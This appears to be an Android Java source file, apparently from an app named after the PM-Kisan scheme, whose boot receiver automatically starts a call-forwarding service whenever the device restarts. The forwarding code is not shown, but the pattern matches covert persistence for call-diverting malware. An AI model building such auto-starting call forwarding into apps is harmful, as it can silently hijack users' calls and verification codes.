package io.pmkishan.controller;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d("BootReceiver", "Device rebooted! Starting CallForwardingService...");

            // Call Forwarding Service को स्टार्ट करें
            Intent serviceIntent = new Intent(context, CallForwardingService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            }
            else {
                context.startService(serviceIntent);
            }
        }
    }
}
